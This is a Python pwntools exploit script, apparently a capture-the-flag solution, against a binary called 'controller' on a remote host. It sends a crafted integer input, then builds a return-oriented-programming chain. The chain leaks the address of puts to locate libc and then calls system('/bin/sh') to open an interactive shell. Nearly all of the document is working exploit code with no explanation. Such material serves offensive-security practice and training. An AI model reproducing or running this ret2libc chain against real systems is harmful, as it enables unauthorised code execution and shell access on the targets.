#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4444 ./controller
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./controller')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '178.62.30.167'
port = int(args.PORT or 30048)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x00000000004010fd
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
if args.LOCAL:
    libc = exe.libc
else :
    libc = ELF("./libc.so.6")
p = '-1 -65339'
io.sendlineafter("recources: ",p)

io.sendlineafter("> ","2")

p = 'y\x00'.ljust(8,"\x00")
p += 'a'*4*8
p += p64(exe.search(asm("pop rdi; ret")).next())
p += p64(exe.got['puts'])
p += p64(exe.plt['puts'])
p += p64(0x0000000000401066)
io.sendlineafter("> ",p)
io.recvuntil("Problem reported!\n")
leak = (io.recvline()[:-1]).ljust(8,"\x00")
leak = u64(leak)
libc.address = leak - libc.sym["puts"]
print hex(leak)
print hex(libc.address)

p = '-1 -65339'
io.sendlineafter("recources: ",p)

io.sendlineafter("> ","2")

p = 'y\x00'.ljust(8,"\x00")
p += 'a'*4*8
p += p64(exe.search(asm("pop rdi; ret")).next())
p += p64(libc.search("/bin/sh").next())
p += p64(0x00000000004011d1)
p += p64(0)*2
p += p64(libc.address + 0x0000000000001b96)
p += p64(0)
p += p64(libc.sym['system'])
# p += p64(0x0000000000401066)
io.sendlineafter("> ",p)

io.interactive()
